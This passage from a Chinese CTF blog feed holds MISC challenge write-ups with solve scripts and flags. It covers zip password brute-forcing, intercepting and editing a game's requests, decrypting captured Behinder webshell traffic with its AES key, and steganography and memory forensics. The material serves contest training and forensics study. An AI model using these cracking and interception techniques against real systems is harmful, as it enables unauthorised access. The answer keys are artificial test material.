int(video.get(cv2.CAP_PROP_FRAME_WIDTH))</span><br><span class=\"line\">video_height = int(video.get(cv2.CAP_PROP_FRAME_HEIGHT))</span><br><span class=\"line\"></span><br><span class=\"line\">start_pixel_x = 5</span><br><span class=\"line\">start_pixel_y = 5</span><br><span class=\"line\">block_size = 10</span><br><span class=\"line\"></span><br><span class=\"line\">out_width = video_width // block_size</span><br><span class=\"line\">out_height = video_height // block_size</span><br><span class=\"line\"></span><br><span class=\"line\">out = np.zeros((out_height, out_width, 3), dtype=np.uint8)</span><br><span class=\"line\"></span><br><span class=\"line\">fps_count = 0</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    success, frame = video.read()</span><br><span class=\"line\">    if not success:</span><br><span class=\"line\">        break</span><br><span class=\"line\"></span><br><span class=\"line\">    for y in range((video_height - start_pixel_y) // block_size):</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            pixel = frame[start_pixel_y + y * block_size, start_pixel_x + fps_count * block_size]</span><br><span class=\"line\">            out[y, fps_count] = pixel</span><br><span class=\"line\">        except Exception as e:</span><br><span class=\"line\">            print(f&quot;Error: &#123;e&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    fps_count += 1</span><br><span class=\"line\"></span><br><span class=\"line\">cv2.imwrite(&#x27;out.png&#x27;, out)</span><br></pre></td></tr></table></figure>\n<p>得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129132551340.png\" alt=\"image-20231129132551340\"></p>\n<p><strong>SYC{we1c0m4_T0_Dc@tH_W0r1d}</strong></p>\n<h2 id=\"窃听风云-v2\"><a class=\"markdownIt-Anchor\" href=\"#窃听风云-v2\">#</a> 窃听风云 - V2</h2>\n<p>这里不做过多的说明了，和 v1 差不多，smtp 邮件协议进行了 ntlm 认证，详细的过程在另一篇文章<strong> NTLM 协议流量解密</strong>的例三中有写，可以移步观看</p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/ACTF2023CTFer%20simulator/",
            "url": "https://nnnpc.github.io/2024/04/16/ACTF2023CTFer%20simulator/",
            "title": "ACTF2023CTFer simulator",
            "date_published": "2024-04-16T05:58:18.967Z",
            "content_html": "<p>访问 service 并抓包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/84TvBuenmgMbykRk.png!thumbnail\" alt=\"\"></p>\n<p>一直放包直到看到 events.yaml，发送到重发器</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vmIq35Cni0YS2BD6.png!thumbnail\" alt=\"\"></p>\n<p>得到 200 的状态码时拦截回包，这时候就可以进行修改配置文件的操作了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/l7GflpSldtVqqIsw.png!thumbnail\" alt=\"\"></p>\n<p>全局搜索，将 100 的 energy 全改成 10000 放包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IcIRL9m3Bz000BJk.png!thumbnail\" alt=\"\"></p>\n<p>修改成功后就可以玩游戏操作了，游戏有几个注意点</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.时间只有两天，第三天9:00时必须拿到8个flag</span><br><span class=\"line\">2.第一天会有考试，需要复习通过考试</span><br><span class=\"line\">3.失败了不要死磕，换种方法</span><br></pre></td></tr></table></figure>\n<p>当然也有小 tips：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.可以在考试前两个小时开始复习（一定的pass机率不过成功率蛮高）</span><br><span class=\"line\">2.在打exp时最后还有inside在手上（越到后面inside越难拿）</span><br><span class=\"line\">3.wrong flag尽量改对</span><br></pre></td></tr></table></figure>\n<p>在第三天 9:00 之前拿到至少 8 个 flag 之后进行抓包，当跳转回重新开始的页面时会有一次交互，截取数据包之后发送就能看到 flag 了<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/71vcXZHYuNSJUji0.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/2023%E6%B5%99%E6%B1%9F%E7%9C%81%E5%86%B3%E8%B5%9B%20Misc/",
            "url": "https://nnnpc.github.io/2024/04/16/2023%E6%B5%99%E6%B1%9F%E7%9C%81%E5%86%B3%E8%B5%9B%20Misc/",
            "title": "2023浙江省决赛 Misc",
            "date_published": "2024-04-16T05:58:18.965Z",
            "content_html": "<h2 id=\"xcode-v58\"><a class=\"markdownIt-Anchor\" href=\"#xcode-v58\">#</a> Xcode v5.8</h2>\n<p>文本中得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hAXBCEaBZMLZNJbRAQnNlOZdARqFAB1QpKa7IF4F5R1ElBKErIKpFQZNcNEc+</span><br></pre></td></tr></table></figure>\n<p>看编码的构造结构和题目提示 xcode，猜测为 xxencode 编码，随波逐流解码得</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">23NBceayYVwLs6qjZLwdL475ZbTDdGt415d7QmQrVhe</span><br></pre></td></tr></table></figure>\n<p>v5.8 提示为 base58，解码得到 flag<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pjZlZCP5TAtle33t.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>DASCTF{The_new_encode_master!!}</strong></p>\n<h2 id=\"ez_signin\"><a class=\"markdownIt-Anchor\" href=\"#ez_signin\">#</a> Ez_Signin</h2>\n<p>解压附件得到加密压缩包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rBwWTSMPc5dCKL9p.png!thumbnail\" alt=\"\"></p>\n<p>ARCHPR 爆破</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LkvAfs8d27Tpd6eM.png!thumbnail\" alt=\"\"></p>\n<p>得到密码：11452</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/v1NmdtZhyyA4wngv.png!thumbnail\" alt=\"\"></p>\n<p>将文本中的内容进行 base32 解码得到按键精灵的脚本</p>\n<p>将脚本复制到按键精灵的源文件界面</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/p8IHxudYgVzn97Cx.png!thumbnail\" alt=\"\"></p>\n<p>F10 运行发现鼠标画出了 flag 字样，于是打开画板运行得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xzg0EQLOAEOvQcQD.png!thumbnail\" alt=\"\"></p>\n<p>如果将脚本运行到最后能发现 flag 是被删除了一部分的，在这个花括号 F12 停止即可</p>\n<p><strong>flag{8f16a9717824aa456eb9a98653eb3993}</strong></p>\n<h2 id=\"newgrating\"><a class=\"markdownIt-Anchor\" href=\"#newgrating\">#</a> NewGrating</h2>\n<p>这题在比赛中并没出，有点小遗憾，赛后把最后的光栅图了解了一下，记录一下</p>\n<p>解压得到流量包，总共七个流，不算多，一个个翻翻看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QnTgpdQxcyrhLlWu.png!thumbnail\" alt=\"\"></p>\n<p>在 0 流得到了冰蝎的马，同样得到了冰蝎的 key，e46023a69f8db309，并且流量是冰蝎 3 的 CBC 模式的 AES 加密。默认 iv 为 0123456789abcdef</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vrUa99WOPsdt3oCB.png!thumbnail\" alt=\"\"></p>\n<p>随便拿流 2 的请求包试试，成功解密</p>\n<p>接下来解密发现流 2、3 都没有什么作用，看到关键的流 4，流量比较大，追踪 tcp 会有点卡，并且返回包会被自动解码，这里建议追踪 http 并且放入 vscode 进行复制解码</p>\n<p>比赛的时候发现自己写的 gui 跑不了这么大的数据，就只能手搓脚本了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">from Crypto.Cipher import AES</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def aes_cbc_decrypt(key, iv, encrypted_text):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        encrypted_text = base64.b64decode(encrypted_text)</span><br><span class=\"line\">        cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class=\"line\"></span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        unpadded_text = _unpad(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\">        return unpadded_text.decode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        return str(e)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def _unpad(text):</span><br><span class=\"line\">    pad = text[-1]</span><br><span class=\"line\">    return text[:-pad]</span><br><span class=\"line\">KEY = &quot;e46023a69f8db309&quot;</span><br><span class=\"line\">IV = &quot;0123456789abcdef&quot;</span><br><span class=\"line\">key = KEY.encode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">iv = IV.encode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">encrypted_text = input(&quot;ENCRYPTDATA：&quot;)</span><br><span class=\"line\">decrypted_text = aes_cbc_decrypt(key, iv, encrypted_text)</span><br><span class=\"line\">print(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\">new = open(&#x27;out.txt&#x27;,&#x27;w&#x27;)</span><br><span class=\"line\">new.write(decrypted_text)</span><br></pre></td></tr></table></figure>\n<p>为了复制大数据方便就给他输出到文本当中了<br>\n在第二个请求包的</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PmszV03fw7AzE9Fc.png!thumbnail\" alt=\"\"></p>\n<p>将 content 字段解码得到了 password.png</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Mp2nPkgSXbalwRE1.png!thumbnail\" alt=\"\"></p>\n<p>同样在第 5 个请求包解码得到了 7z 压缩包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5MlhF2QdGzI2mklW.png!thumbnail\" alt=\"\"></p>\n<p>分别导出，发现压缩包需要密码，需要解密图片拿到密码</p>\n<p>该图片是五帧的光栅图，也就是五个图层通过位移、消除操作合并成的一张图片</p>\n<p>关于这个 5 层是怎么来的现在所知道的只有试，本质上就是隔 n 个像素提取 1 列进行组合看看能不能拼成可识别的图形</p>\n<h3 id=\"方法一\"><a class=\"markdownIt-Anchor\" href=\"#方法一\">#</a> 方法一：</h3>\n<p>知道了原理之后利用脚本进行提取（均为赛后别的师傅的脚本，来利用学习）：</p>\n<p>一：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from PIL import Image</span><br><span class=\"line\">import numpy as np</span><br><span class=\"line\"></span><br><span class=\"line\">img = Image.open(&#x27;Password.png&#x27;).convert(&#x27;L&#x27;)</span><br><span class=\"line\">width, height = img.size</span><br><span class=\"line\">img_data = np.array(img)</span><br><span class=\"line\">start = 1</span><br><span class=\"line\">interval = 5</span><br><span class=\"line\">for i in range(start, width, interval):</span><br><span class=\"line\">        img_data[:, i:i+interval-1] = 0</span><br><span class=\"line\">Image.fromarray(img_data)</span><br><span class=\"line\"></span><br><span class=\"line\">new_image = Image.fromarray(img_data)</span><br><span class=\"line\">new_image.save(&#x27;processed_image.png&#x27;)</span><br></pre></td></tr></table></figure>\n<p>二：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from PIL import Image</span><br><span class=\"line\">import numpy as np</span><br><span class=\"line\"></span><br><span class=\"line\">img = np.array(Image.open(&#x27;Password.png&#x27;))</span><br><span class=\"line\">for i in range(5):</span><br><span class=\"line\">    z = np.zeros_like(img)</span><br><span class=\"line\">    z[:, i::5, :] = img[:, i::5, :]</span><br><span class=\"line\">    Image.fromarray(z).show()</span><br></pre></td></tr></table></figure>\n<p>以上两个脚本都能正确分离出五帧光栅图，使用的均是相隔 5 个像素进行提取的方法</p>\n<h3 id=\"方法二\"><a class=\"markdownIt-Anchor\" href=\"#方法二\">#</a> 方法二：</h3>\n<p>去了解一下光栅图的制作方法可以知道，光栅图其实就是利用了人的肉眼补全原理，加上多张文字的消除、偏移、重叠而成。重叠之后人的肉眼无法辨别而达到一个隐藏的作用，因此可以根据光栅与帧数的公式去制作光栅，使人的肉眼能够辨别每一帧的字符，达到一个 &quot;分离&quot; 的效果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">（黑色像素宽度+白色像素宽度）/ 白色像素宽度 = 帧数</span><br></pre></td></tr></table></figure>\n<p>因此这里使用 PS 制作黑色为 4 像素，白色为 1 像素的光栅<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gMFtoLM7ssjkOeL6.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>移动光栅能得到全部的 5 帧文字</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DJQBF4uztmylpLbP.png!thumbnail\" alt=\"\"></p>\n<p>得到 password：PPeRLR6SEmHGC</p>\n<p>解开压缩包得到 flag</p>\n<p><strong>DASCTF{d68b6013-d70a-4ada-926d-68fe3265360a}</strong></p>\n<p>总结：这次比赛的 misc 题有点少，前面两题一般，最后的光栅图挺有意思的</p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/2023%E9%87%91%E7%9B%BE%E6%9D%AFMisc/",
            "url": "https://nnnpc.github.io/2024/04/16/2023%E9%87%91%E7%9B%BE%E6%9D%AFMisc/",
            "title": "2023金盾杯Misc",
            "date_published": "2024-04-16T05:58:18.963Z",
            "content_html": "<h2 id=\"来都来了\"><a class=\"markdownIt-Anchor\" href=\"#来都来了\">#</a> 来都来了</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127173633085.png\" alt=\"\"></p>\n<p>得到伪加密附件，修改数据 09 为 00</p>\n<p>解压压缩包得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127174314449.png\" alt=\"\"></p>\n<p>解码保存为文本文件，缩小得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127174428740.png\" alt=\"\"></p>\n<h2 id=\"honor\"><a class=\"markdownIt-Anchor\" href=\"#honor\">#</a> honor</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127175353529.png\" alt=\"\"></p>\n<p>得到一张 png，拖入 winhex 查看，发现是 jpg 的文件尾，搜索文件头手撕下来</p>\n<p>得到 jpg</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127175512078.png\" alt=\"\"></p>\n<p>没有找到有用信息，利用 stegseek 进行 steghide 爆破</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127175623360.png\" alt=\"\"></p>\n<p>得到：f6l3-a6ag3c}{-bc4c5e28-e4649c76b0-707e6069</p>\n<p>W 型栅栏爆破得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127175759498.png\" alt=\"\"></p>\n<p><strong>flag{424c076e-768c-3636-acb5-4676900b9eec}</strong></p>\n<h2 id=\"芙宁娜\"><a class=\"markdownIt-Anchor\" href=\"#芙宁娜\">#</a> 芙宁娜</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127175928269.png\" alt=\"\"></p>\n<p>解压附件拿到图片，解码图片上的 base64 得到前半段 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;bc8394aa-7e32-47e8-a9fd-1bf683af</span><br></pre></td></tr></table></figure>\n<p>背景图上有不少的数据，但是被遮挡无法直接进行识别提取，这里可以 winhex 或者 010 直接在文件结构中提取数据块</p>\n<p>也可以使用 exiftools 直接进行提取，这里需要注意一个点，背景图上四个数据块的顺序是错误的，按照从上到下依次标号为 1、2、3、4，那么正确的顺序应该是 1、2、4、3，排列好之后将提取后的数据以 16 进制的形式写入到文件当中（这里对没有逆过 pyc 的我来说有点坐牢）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127180734668.png\" alt=\"\"></p>\n<p>查看文件头发现是 pyc 文件，想到了剑龙隐写，这里需要 python3.6 的环境来运行，但尝试了好多次依然报错，和背景图没有被遮挡的部分比较，发现有一些数据被出题人篡改了，需要自己手动改回来（这里我直接放出改完之后的文件比较结果，方便查看）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127181702566.png\" alt=\"\"></p>\n<p>对照修改之后重新利用 stegosaurus 得到后半段 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./stegosaurus.py -x 2.pyc</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127182159447.png\" alt=\"\"></p>\n<p>拼接得到完整 flag，<strong>flag{bc8394aa-7e32-47e8-a9fd-1bf683af8e8f}</strong></p>\n<p>ps：最后一道流量实在是太杂太大了，wireshark 跑不动，没继续做了</p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E2%80%9C%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A1%B9-%E5%AD%A6%E7%94%9F%E7%BB%84%E5%88%9D%E8%B5%9Bmisc/",
            "url": "https://nnnpc.github.io/2024/04/16/%E2%80%9C%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A1%B9-%E5%AD%A6%E7%94%9F%E7%BB%84%E5%88%9D%E8%B5%9Bmisc/",
            "title": "“技能兴鲁”网络安全赛项-学生组初赛misc",
            "date_published": "2024-04-16T05:58:18.960Z",
            "content_html": "<h2 id=\"时间不多了\"><a class=\"markdownIt-Anchor\" href=\"#时间不多了\">#</a> 时间不多了</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">题目描述: 2023还有两个月不到就过去了，你准备好迎接2024了吗?</span><br></pre></td></tr></table></figure>\n<p>解压附件得到很多张二维码和一张日历，用脚本批量扫描看看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">from PIL import Image</span><br><span class=\"line\">from pyzbar.pyzbar import decode</span><br><span class=\"line\"></span><br><span class=\"line\">def scan_qrcodes(directory):</span><br><span class=\"line\">    with open(&#x27;qrcode_results.txt&#x27;, &#x27;w&#x27;) as output_file:</span><br><span class=\"line\">        file_list = sorted(os.listdir(directory), key=lambda x: int(&#x27;&#x27;.join(filter(str.isdigit, x))))</span><br><span class=\"line\">        for file_name in file_list:</span><br><span class=\"line\">            file_path = os.path.join(directory, file_name)</span><br><span class=\"line\">            try:</span><br><span class=\"line\">                decoded = decode(Image.open(file_path))</span><br><span class=\"line\">                if decoded:</span><br><span class=\"line\">                    output_file.write(f&quot;File: &#123;file_name&#125;\\n&quot;)</span><br><span class=\"line\">                    for obj_number, obj in enumerate(decoded, start=1):</span><br><span class=\"line\">                        output_file.write(f&quot;QR Code &#123;obj_number&#125; data: &#123;obj.data.decode(&#x27;utf-8&#x27;)&#125;\\n&quot;)</span><br><span class=\"line\">                    output_file.write(&quot;\\n&quot;)</span><br><span class=\"line\">            except Exception as e:</span><br><span class=\"line\">                pass</span><br><span class=\"line\">scan_qrcodes(&#x27;attachment&#x27;)</span><br></pre></td></tr></table></figure>\n<p>发现大部分二维码都是没用的，少部分有 base64 编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">File 2: attachment\\qrcode_10.png</span><br><span class=\"line\">QR Code data: MiAzIDQgOSAxNSAxNyAxOCAyMyAzMA==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_12.png</span><br><span class=\"line\">QR Code 1 data: NiAxMyAyMCAyNyAyOA==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_14.png</span><br><span class=\"line\">QR Code 1 data: MiAxNSAyMiAxNyAyNCAxNg==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_15.png</span><br><span class=\"line\">QR Code 1 data: NiA1IDQgMTEgMTggMjUgMjYgMjcgMjggMjAgMjE=</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_16.png</span><br><span class=\"line\">QR Code 1 data: MiAzIDkgMTUgMjMgMzAgMzE=</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_25.png</span><br><span class=\"line\">QR Code 1 data: NSAxMyAyMCAyNyAxNCAyMQ==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_26.png</span><br><span class=\"line\">QR Code 1 data: NiAxOSAyNiAyMSAyOCAyMA==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_27.png</span><br><span class=\"line\">QR Code 1 data: OSAxMCAxMSAxNyAyNCAzMQ==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_35.png</span><br><span class=\"line\">QR Code 1 data: MSAyIDMgOCAxNSAxNiAxNyAyMiAyOSAzMA==</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_36.png</span><br><span class=\"line\">QR Code 1 data: MiAzIDkgMTYgMTcgMjQgMzAgMzE=</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_37.png</span><br><span class=\"line\">QR Code 1 data: MiA4IDE1IDIzIDI0IDE4IDExIDM=</span><br><span class=\"line\"></span><br><span class=\"line\">File: qrcode_38.png</span><br><span class=\"line\">QR Code 1 data: MSAyIDkgMTcgMjMgMzAgMjk=</span><br></pre></td></tr></table></figure>\n<p>解码所有的 base64</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2 3 4 9 15 17 18 23 30</span><br><span class=\"line\">6 13 20 27 28</span><br><span class=\"line\">2 15 22 17 24 16</span><br><span class=\"line\">6 5 4 11 18 25 26 27 28 20 21</span><br><span class=\"line\">2 3 9 15 23 30 31</span><br><span class=\"line\">5 13 20 27 14 21</span><br><span class=\"line\">6 19 26 21 28 20</span><br><span class=\"line\">9 10 11 17 24 31</span><br><span class=\"line\">1 2 3 8 15 16 17 22 29 30</span><br><span class=\"line\">2 3 9 16 17 24 30 31</span><br><span class=\"line\">2 8 15 23 24 18 11 3</span><br><span class=\"line\">1 2 9 17 23 30 29</span><br></pre></td></tr></table></figure>\n<p>接下来就和键盘差不多，在日历上依次拼接连接即可，每一行代表一个字符<br>\n<strong> flag*</strong>*{DATESO}**</p>\n<h2 id=\"未知的加密\"><a class=\"markdownIt-Anchor\" href=\"#未知的加密\">#</a> 未知的加密</h2>\n<p>拿到加密的压缩包，先拖入 winhex 看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BhH1uvhFnJvZolRU.png!thumbnail\" alt=\"\"></p>\n<p>末尾说明了压缩包密码的构造，进行掩码爆破</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9gCMAm0yJcVwZocF.png!thumbnail\" alt=\"\"></p>\n<p>得到密码 Sierting2023，解压压缩包</p>\n<p>file 知道是一个磁盘镜像文件，使用取证大师导出其中的 enc（这里也可以使用 7z 解压出 enc，方法挺多的，能导出即可）</p>\n<p>接着使用 vc 挂载 enc 文件，密码依然是 Sierting2023</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mJCBdGUO4Elr5vxl.png!thumbnail\" alt=\"\"></p>\n<p>hint 指示我们需要去恢复 swp 文件，swp 文件便是使用 vim 编辑器时因为错误退出而生成的一个备份文件，直接用 vim 命令恢复即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim -r .flag.swp</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JLTuOWjqHeRXgQg9.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{d89421ac9cf847b0173ee08a74cfd48b}</strong></p>\n<h2 id=\"datas_secret\"><a class=\"markdownIt-Anchor\" href=\"#datas_secret\">#</a> Datas_secret</h2>\n<p>解压附件得到 vmem 文件，内存取证，使用工具：vol2</p>\n<p>首先使用 imageinfo 查看操作系统</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f image.vmem imageinfo</span><br></pre></td></tr></table></figure>\n<p><img 